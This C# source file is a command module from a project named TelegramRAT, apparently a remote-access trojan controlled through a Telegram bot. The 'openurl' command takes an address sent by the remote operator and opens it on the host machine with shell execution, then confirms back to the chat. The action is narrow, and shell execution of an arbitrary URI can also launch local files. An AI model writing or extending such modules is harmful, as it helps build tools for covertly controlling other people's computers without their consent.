using System.Diagnostics;
using Telegram.Bot;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.Remote;

public class OpenUrlCommand(ITelegramBotClient botClient, IBotNotificationService notificationService) : AbstractBotCommand
{
    public override string Command => "openurl";
    public override string[] Aliases => new[] { "url" };
    public override string Description => "Open URL on default browser.";
    public override string Example => "/openurl google.com";
    public override int ArgsCount => -2;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            var urlInput = (model.RawArgs ?? string.Empty).Trim();

            if (!Uri.TryCreate(urlInput, UriKind.Absolute, out var uri))
            {
                if (!string.IsNullOrEmpty(urlInput) && Uri.TryCreate($"https://{urlInput}", UriKind.Absolute, out var httpsUri))
                {
                    uri = httpsUri;
                }
                else
                {
                    await notificationService.SendErrorAsync(model.Message, new ArgumentException("Invalid URL provided."));
                    return;
                }
            }

            var startInfo = new ProcessStartInfo
            {
                FileName = uri.AbsoluteUri,
                UseShellExecute = true
            };

            using var process = Process.Start(startInfo);

            if (process == null)
            {
                await notificationService.SendErrorAsync(model.Message, new InvalidOperationException("Failed to launch the URL."));
                return;
            }

            await botClient.SendMessage(model.Message.Chat.Id, "Url opened!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
